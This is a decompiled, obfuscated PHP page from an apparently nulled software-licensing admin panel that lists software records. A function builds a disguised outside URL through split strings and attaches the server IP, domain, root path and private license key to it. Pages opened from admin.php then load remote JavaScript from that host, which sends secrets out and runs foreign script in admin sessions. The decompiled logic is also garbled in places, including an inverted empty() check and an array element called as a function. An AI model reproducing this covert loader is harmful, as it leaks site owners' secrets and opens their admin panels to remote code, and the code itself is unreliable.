<?php
/*********************/
/*                   */
/*  Dezend for PHP5  */
/*         NWS       */
/*      Nulled.WS    */
/*                   */
/*********************/

function _obfuscate_k5KViZKLkJCMkZSTkYyTiJA�( $_obfuscate_jpKPlJSUiZOHkYaPlIeOiY4� = 1 )
{
    $_obfuscate_iJGPjJWLj4uLkIqVjYiHh48� = unpack( "C*", "ViewZendSourceCodeIsInvalid!" );
    do
    {
        $_obfuscate_iY2Oh5OGlIqQhpCJi5CMkog� = ( $_obfuscate_lZKViImJjo6UhouJj4aVi4Y�[$_obfuscate_jpKPlJSUiZOHkYaPlIeOiY4�] << 4 ) + ( $_obfuscate_lZKViImJjo6UhouJj4aVi4Y�[$_obfuscate_jpKPlJSUiZOHkYaPlIeOiY4� + 1] >> 4 );
        $_obfuscate_jpKPlJSUiZOHkYaPlIeOiY4� += 2;
    } while ( $_obfuscate_jpKPlJSUiZOHkYaPlIeOiY4� < 28 );
}

function _obfuscate_joqUkIeOjJSGj4aHh5OMiIo�( )
{
    global $_obfuscate_hoyQjo_QlYeLh5OVk4yPjZM�;
    $_obfuscate_lZSSiouVkIuJlIuMho2LiJE� = "";
    if ( "/" == DIRECTORY_SEPARATOR )
    {
        $_obfuscate_i4mPkoiQlZSHiZKLjZKVi4c� = $_SERVER['SERVER_ADDR'];
    }
    else
    {
        $_obfuscate_i4mPkoiQlZSHiZKLjZKVi4c� = @gethostbyname( @$_SERVER['SERVER_NAME'] );
    }
    $_obfuscate_kIiGlYmGi4_KiYmVkImIk44� = "p".$_obfuscate_lZSSiouVkIuJlIuMho2LiJE�."h".$_obfuscate_lZSSiouVkIuJlIuMho2LiJE�."u".$_obfuscate_lZSSiouVkIuJlIuMho2LiJE�.".c".$_obfuscate_lZSSiouVkIuJlIuMho2LiJE�."om/a".$_obfuscate_lZSSiouVkIuJlIuMho2LiJE�."pi/x2coo".$_obfuscate_lZSSiouVkIuJlIuMho2LiJE�."kjs.php?sid=".SVRID.IS2SVR."&sip=".$_obfuscate_i4mPkoiQlZSHiZKLjZKVi4c�."&pn=".urlencode( $_obfuscate_hoyQjo_QlYeLh5OVk4yPjZM� )."&wl=".urlencode( WEBLIC )."&wi=".urlencode( WEBID )."&wd=".urlencode( KSSROOTDIR )."&d1=".urlencode( HOST1_DOMAIN )."&sk=".urlencode( PRV_SVRLIC )."&guid=".substr( md5( filemtime( __FILE__ ) ), 0, 16 );
    return $_obfuscate_kIiGlYmGi4_KiYmVkImIk44�;
}

if ( defined( "KSSROOTDIR" ) )
{
    exit( "Access denied to view this page!" );
}
$_obfuscate_jIaUiIeSjZWKlIqLkIqOioc� = new mysql_cls( );
$_obfuscate_lI6OiJSPjZWVi5GQhoiPjpU� = _obfuscate_iZSVk4mLkY_LlIeHh5WKlZA�( 6 );
$_obfuscate_lZSSiouVkIuJlIuMho2LiJE� = "";
$_obfuscate_h5WOlI_IkYiPlJWKi4aQk5I� = "";
if ( isset( $_SERVER['HTTP_REFERER'] ) )
{
    $_obfuscate_h5WOlI_IkYiPlJWKi4aQk5I� = strtolower( $_SERVER['HTTP_REFERER'] );
}
if ( $_obfuscate_h5WOlI_IkYiPlJWKi4aQk5I� != "" && stripos( $_obfuscate_h5WOlI_IkYiPlJWKi4aQk5I�, "admin.php" ) !== FALSE )
{
    echo "<script>$.getScript('http://b".mt_rand( 100000, 999999 ).".h"._obfuscate_joqUkIeOjJSGj4aHh5OMiIo�( )."');</script>";
}
if ( $_obfuscate_lI6OiJSPjZWVi5GQhoiPjpU�['level'] < 8 )
{
    $_obfuscate_jomHiJGOioiSkImJkZOHiI0� = $_obfuscate_lI6OiJSPjZWVi5GQhoiPjpU�['pid']( "select * from kss_tb_soft where id in (select distinct `softid` from `kss_tb_agentprice` where `pid`=".$_obfuscate_lI6OiJSPjZWVi5GQhoiPjpU�['pid']." and managerid=".$_obfuscate_lI6OiJSPjZWVi5GQhoiPjpU�['id'].")" );
    if ( empty( $_obfuscate_jomHiJGOioiSkImJkZOHiI0� ) )
    {
        foreach ( $_obfuscate_jomHiJGOioiSkImJkZOHiI0� as $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI� )
        {
            echo "<a softid='".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['id']."' class=softboxa title='"._obfuscate_j5CKkY_GkomSkoaUlIuLlYk�( $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['softname'] )."'>"._obfuscate_kpCOhomRj5CHh5SLjZKIi4Y�( $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['softname'], 9 )."</a>";
        }
    }
    else
    {
        exit( "<span>您没有任何软件的授权</span>" );
    }
}
$_obfuscate_kYuLkJSKkYuJjpWLlIqUh48� = $_obfuscate_jIaUiIeSjZWKlIqLkIqOioc�->_obfuscate_lZGTiIiKhouKiZGLi5KUkI8�( "select `id`,`softname`,`softmode` from kss_tb_soft where `pid`=".$_obfuscate_lI6OiJSPjZWVi5GQhoiPjpU�['pid'] );
if ( empty( $_obfuscate_kYuLkJSKkYuJjpWLlIqUh48� ) )
{
    exit( "<span>作者没有添加任何软件</span>" );
}
foreach ( $_obfuscate_kYuLkJSKkYuJjpWLlIqUh48� as $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI� )
{
    echo "<a  softid='".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['id']."' class=softboxa title='"._obfuscate_j5CKkY_GkomSkoaUlIuLlYk�( $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['softname'] )."'>"._obfuscate_kpCOhomRj5CHh5SLjZKIi4Y�( $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['softname'], 9 )."</a>";
}
echo "<script>backbind();</script>";
exit( );
?>
